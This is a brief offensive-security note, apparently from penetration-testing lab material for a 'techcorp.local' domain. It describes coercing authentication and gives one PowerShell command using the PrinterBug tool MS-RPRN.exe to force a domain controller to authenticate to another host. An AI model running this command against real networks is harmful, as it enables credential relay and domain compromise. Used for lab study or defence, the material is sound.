# Coerce authentication

Multiple methods allow to coerce an authentication from a server to an arbitrary machine.

## With PrinterBug

```powershell
> .\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

This will force an authentication from `us-dc` to `us-web`.
